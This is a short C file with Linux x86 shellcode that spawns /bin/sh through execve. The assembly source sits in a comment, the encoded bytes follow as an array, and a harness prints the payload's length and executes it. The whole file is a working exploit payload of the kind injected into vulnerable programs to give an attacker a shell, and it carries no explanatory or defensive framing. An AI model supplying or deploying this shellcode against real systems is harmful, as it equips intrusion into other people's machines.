/* Linux x86 Shellcode
 * execve('/bin/sh')
 *
global _start

section .text
_start:

xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, 0xb
int 0x80
*/
#include<stdio.h>
#include<string.h>

unsigned char payload[]=
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";

void main() {
	printf("Shellcode Length : %d\n", (int) strlen(payload));
	(*(void (*)()) payload)();
}
